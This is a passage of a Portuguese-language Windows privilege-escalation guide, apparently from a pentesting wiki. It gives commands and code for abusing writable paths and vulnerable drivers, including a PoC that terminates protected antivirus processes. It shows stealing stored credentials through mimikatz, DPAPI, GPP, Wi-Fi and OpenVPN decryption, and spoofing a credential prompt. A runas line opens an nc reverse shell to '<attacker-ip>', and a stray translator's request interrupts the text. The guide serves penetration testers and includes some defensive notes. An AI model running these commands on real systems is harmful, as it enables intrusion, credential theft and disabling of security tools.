accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ carrega automaticamente qualquer DLL de plugin nas subpastas `plugins`. Se existir uma instalação portátil/copiável gravável, colocar um plugin malicioso dá execução automática de código dentro de `notepad++.exe` em cada inicialização (incluindo a partir de `DllMain` e callbacks do plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
**Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Procure por possíveis drivers **third party weird/vulnerable**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se um driver expõe um primitive arbitrário de leitura/escrita de kernel (comum em IOCTL handlers mal projetados), você pode escalar roubando diretamente um token SYSTEM da memória do kernel. Veja a técnica passo a passo aqui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Para bugs de race-condition onde a chamada vulnerável abre um caminho do Object Manager controlado pelo atacante, desacelerar deliberadamente a lookup (usando componentes de tamanho máximo ou cadeias profundas de diretórios) pode estender a janela de microssegundos para dezenas de microssegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitivas de corrupção de memória de hive do Registry

Vulnerabilidades modernas de hive permitem fazer grooming de layouts determinísticos, abusar de descendentes HKLM/HKU graváveis e converter corrupção de metadata em overflows de kernel paged-pool sem um driver customizado. Aprenda a cadeia completa aqui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN em device objects (LPE + EDR kill)

Alguns drivers signed de terceiros criam seu device object com um SDDL forte via IoCreateDeviceSecure, mas esquecem de definir FILE_DEVICE_SECURE_OPEN em DeviceCharacteristics. Sem essa flag, a DACL segura não é aplicada quando o device é aberto por um path contendo um componente extra, permitindo que qualquer usuário sem privilégios obtenha um handle usando um namespace path como:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (de um caso real)

Depois que um usuário consegue abrir o device, IOCTLs privilegiados expostos pelo driver podem ser abusados para LPE e tampering. Capacidades de exemplo observadas na prática:
- Retornar handles com full-access para processos arbitrários (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Leitura/escrita raw de disco sem restrições (tampering offline, truques de persistence em boot-time).
- Finalizar processos arbitrários, incluindo Protected Process/Light (PP/PPL), permitindo AV/EDR kill a partir do user land via kernel.

Padrão mínimo de PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigações para desenvolvedores
- Sempre defina FILE_DEVICE_SECURE_OPEN ao criar objetos de dispositivo destinados a serem restringidos por um DACL.
- Valide o contexto do caller para operações privilegiadas. Adicione verificações PP/PPL antes de permitir terminação de processos ou retornos de handles.
- Restrinja IOCTLs (access masks, METHOD_*, validação de entrada) e considere modelos brokered em vez de privilégios diretos de kernel.

Ideias de detecção para defenders
- Monitore opens em user-mode de nomes de device suspeitos (por exemplo, \\ .\\amsdk*) e sequências específicas de IOCTL indicativas de abuso.
- Faça enforce da vulnerable driver blocklist da Microsoft (HVCI/WDAC/Smart App Control) e mantenha suas próprias listas allow/deny.


## PATH DLL Hijacking

Se você tiver **permissões de escrita dentro de uma pasta presente no PATH** você pode conseguir hijack de uma DLL carregada por um processo e **escalar privilégios**.

Verifique as permissões de todas as pastas dentro do PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para mais informações sobre como abusar desta verificação:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Esta é uma variante de **Windows uncontrolled search path** que afeta aplicações **Node.js** e **Electron** quando fazem um import simples como `require("foo")` e o módulo esperado está **missing**.

O Node resolve pacotes subindo a árvore de diretórios e verificando pastas `node_modules` em cada pai. No Windows, essa busca pode alcançar a raiz da unidade, então uma aplicação iniciada a partir de `C:\Users\Administrator\project\app.js` pode acabar verificando:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Se um **low-privileged user** conseguir criar `C:\node_modules`, ele pode colocar um `foo.js` malicioso (ou uma pasta de pacote) e esperar que um processo **higher-privileged Node/Electron** resolva a dependência ausente. O payload executa no contexto de segurança do processo vítima, então isso se torna **LPE** sempre que o alvo roda como administrator, a partir de uma tarefa agendada/serviço wrapper elevado, ou de um app desktop privilegiado iniciado automaticamente.

Isso é especialmente comum quando:

- uma dependência é declarada em `optionalDependencies`
- uma biblioteca de terceiros encapsula `require("foo")` em `try/catch` e continua em caso de falha
- um package foi removido de builds de produção, omitido durante o empacotamento ou falhou ao instalar
- o `require()` vulnerável fica profundamente na dependency tree em vez de no código principal da aplicação

### Hunting targets vulneráveis

Use **Procmon** para provar o caminho de resolução:

- Filtre por `Process Name` = executável alvo (`node.exe`, o EXE do app Electron, ou o processo wrapper)
- Filtre por `Path` `contains` `node_modules`
- Foque em `NAME NOT FOUND` e na abertura final bem-sucedida em `C:\node_modules`

Padrões úteis de code-review em arquivos `.asar` desempacotados ou fontes da aplicação:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifique o **nome do pacote ausente** no Procmon ou na revisão do código-fonte.
2. Crie o diretório raiz de busca se ele ainda não existir:
```powershell
mkdir C:\node_modules
```
3. Solte um módulo com o nome exatamente esperado:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Acione a aplicação vítima. Se a aplicação tentar `require("foo")` e o módulo legítimo estiver ausente, o Node pode carregar `C:\node_modules\foo.js`.

Exemplos reais de módulos opcionais ausentes que se encaixam nesse padrão incluem `bluebird` e `utf-8-validate`, mas a **technique** reutilizável é esta: encontre qualquer **missing bare import** que um processo Node/Electron privilegiado no Windows vá resolver.

### Detection and hardening ideas

- Alert when a user creates `C:\node_modules` or writes new `.js` files/packages there.
- Hunt for high-integrity processes reading from `C:\node_modules\*`.
- Package all runtime dependencies in production and audit `optionalDependencies` usage.
- Review third-party code for silent `try { require("...") } catch {}` patterns.
- Disable optional probes when the library supports it (for example, some `ws` deployments can avoid the legacy `utf-8-validate` probe with `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### arquivo hosts

Verifique outros computadores conhecidos codificados no arquivo hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de Rede & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Portas Abertas

Verifique **serviços restritos** do lado de fora
```bash
netstat -ano #Opened ports?
```
### Tabela de Roteamento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regras de Firewall

[**Verifique esta página para comandos relacionados ao Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desativar, desativar...)**

Mais[ comandos para enumeração de rede aqui](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` também pode ser encontrado em `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se você obter o usuário root, você pode escutar em qualquer porta (na primeira vez que você usar `nc.exe` para escutar em uma porta, ele vai perguntar via GUI se o `nc` deve ser permitido pelo firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar facilmente o bash como root, você pode tentar `--default-user root`

Você pode explorar o sistema de arquivos do `WSL` na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciais do Windows

### Credenciais do Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

De [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
O Windows Vault armazena credenciais de usuário para servidores, sites e outros programas que o **Windows** pode **fazer login dos usuários automaticamente**. À primeira vista, isso pode parecer que os usuários agora podem armazenar suas credenciais do Facebook, credenciais do Twitter, credenciais do Gmail etc., para que façam login automaticamente via navegadores. Mas não é assim.

O Windows Vault armazena credenciais que o Windows pode usar para fazer login dos usuários automaticamente, o que significa que qualquer **aplicação Windows que precise de credenciais para acessar um recurso** (servidor ou site) **pode fazer uso deste Credential Manager** & Windows Vault e usar as credenciais fornecidas em vez de os usuários digitarem o nome de usuário e a senha o tempo todo.

A menos que as aplicações interajam com o Credential Manager, não acho que seja possível para elas usar as credenciais de um determinado recurso. Então, se sua aplicação quiser fazer uso do vault, ela deve de alguma forma **se comunicar com o credential manager e solicitar as credenciais para esse recurso** do vault de armazenamento padrão.

Use o `cmdkey` para listar as credenciais armazenadas na máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Então, você pode usar `runas` com as opções `/savecred` para usar as credenciais salvas. O exemplo a seguir está chamando um binário remoto via um compartilhamento SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` com um conjunto de credenciais fornecido.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

A **Data Protection API (DPAPI)** fornece um método para criptografia simétrica de dados, usado predominantemente dentro do sistema operacional Windows para a criptografia simétrica de chaves privadas assimétricas. Essa criptografia aproveita um segredo do usuário ou do sistema para contribuir significativamente para a entropia.

**DPAPI permite a criptografia de chaves por meio de uma chave simétrica derivada dos segredos de login do usuário**. Em cenários envolvendo criptografia do sistema, ela utiliza os segredos de autenticação de domínio do sistema.

Chaves RSA do usuário criptografadas, usando DPAPI, são armazenadas no diretório `%APPDATA%\Microsoft\Protect\{SID}`, onde `{SID}` representa o [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) do usuário. **A chave DPAPI, localizada junto com a master key que protege as chaves privadas do usuário no mesmo arquivo**, normalmente consiste em 64 bytes de dados aleatórios. (É importante notar que o acesso a este diretório é restrito, impedindo listar seu conteúdo via comando `dir` no CMD, embora ele possa ser listado por meio do PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Você pode usar o **mimikatz module** `dpapi::masterkey` com os argumentos apropriados (`/pvk` ou `/rpc`) para descriptografá-lo.

Os **credentials files protegidos pela master password** geralmente estão localizados em:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Você pode usar o **mimikatz module** `dpapi::cred` com o `/masterkey` apropriado para descriptografar.\
Você pode **extrair muitas DPAPI** **masterkeys** da **memory** com o módulo `sekurlsa::dpapi` (se você for root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** são frequentemente usadas para **scripting** e tarefas de automação como uma forma de armazenar credentials encrypted de maneira conveniente. As credentials são protegidas usando **DPAPI**, o que normalmente significa que elas só podem ser descriptografadas pelo mesmo usuário no mesmo computador em que foram criadas.

Para **decrypt** uma PS credentials a partir do arquivo que a contém, você pode fazer:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexões RDP salvas

Você pode encontrá-las em `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e em `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos executados recentemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gerenciador de Credenciais do Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use o módulo **Mimikatz** `dpapi::rdg` com o `/masterkey` apropriado para **descriptografar qualquer arquivo .rdg**\
Você pode **extrair muitas DPAPI masterkeys** da memória com o módulo `sekurlsa::dpapi` do Mimikatz

### Sticky Notes

As pessoas ხშირად usam o app StickyNotes em estações de trabalho Windows para **salvar senhas** e outras informações, sem perceber que é um arquivo de banco de dados. Esse arquivo está localizado em `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` e sempre vale a pena procurar e examinar.

### AppCmd.exe

**Observe que, para recuperar senhas do AppCmd.exe, você precisa ser Administrator e executar em um nível High Integrity.**\
**AppCmd.exe** está localizado no diretório `%systemroot%\system32\inetsrv\`.\
Se esse arquivo existir, então é possível que algumas **credentials** tenham sido configuradas e possam ser **recuperadas**.

Este código foi extraído de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifique se `C:\Windows\CCM\SCClient.exe` existe .\
Os instaladores são **executados com privilégios de SYSTEM**, muitos são vulneráveis a **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Arquivos e Registro (Credenciais)

### Credenciais do Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys podem estar armazenadas dentro da registry key `HKCU\Software\OpenSSH\Agent\Keys`, então você deve verificar se há algo interessante lá:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se você encontrar qualquer entrada dentro desse caminho, provavelmente será uma chave SSH salva. Ela é armazenada criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Mais informações sobre essa técnica aqui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se o serviço `ssh-agent` não estiver em execução e você quiser que ele inicie automaticamente na inicialização, execute:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Parece que esta técnica não é mais válida. Tentei criar algumas chaves ssh, adicioná-las com `ssh-add` e fazer login via ssh em uma máquina. O registro HKCU\Software\OpenSSH\Agent\Keys não existe e o procmon não identificou o uso de `dpapi.dll` durante a autenticação de chave assimétrica.

### Arquivos unattended
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Você também pode procurar esses arquivos usando **metasploit**: _post/windows/gather/enum_unattend_

Exemplo de conteúdo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backups de SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciais na Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Procure por um arquivo chamado **SiteList.xml**

### Cached GPP Pasword

Uma funcionalidade estava anteriormente disponível e permitia a implantação de contas de administrador local personalizadas em um grupo de máquinas via Group Policy Preferences (GPP). No entanto, esse método tinha falhas de segurança significativas. Primeiro, os Group Policy Objects (GPOs), armazenados como arquivos XML em SYSVOL, podiam ser acessados por qualquer usuário do domínio. Segundo, as senhas dentro desses GPPs, criptografadas com AES256 usando uma chave padrão documentada publicamente, podiam ser descriptografadas por qualquer usuário autenticado. Isso representava um risco sério, pois poderia permitir que usuários obtivessem privilégios elevados.

Para mitigar esse risco, foi desenvolvida uma função para escanear arquivos GPP em cache local contendo um campo "cpassword" que não esteja vazio. Ao encontrar tal arquivo, a função descriptografa a senha e retorna um objeto PowerShell personalizado. Esse objeto inclui detalhes sobre o GPP e a localização do arquivo, ajudando na identificação e correção dessa vulnerabilidade de segurança.

Procure em `C:\ProgramData\Microsoft\Group Policy\history` ou em _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior ao W Vista)_ por estes arquivos:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descriptografar a cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obter as senhas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemplo de web.config com credenciais:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciais OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Pedir credenciais

Você sempre pode **pedir ao usuário para inserir suas credenciais ou até mesmo as credenciais de outro usuário** se você acha que ele pode conhecê-las (observe que **pedir** diretamente ao cliente as **credenciais** é realmente **arriscado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possíveis nomes de arquivos contendo credenciais**

Arquivos conhecidos que, em algum momento, continham **passwords** em **clear-text** ou **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Preciso que você envie o conteúdo do arquivo `src/windows-hardening/windows-local-privilege-escalation/README.md` (ou os trechos a traduzir).  
Com apenas “Search all of the proposed files:” não há texto suficiente para traduzir.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciais na RecycleBin

Você também deve verificar a Bin para procurar credenciais dentro dela

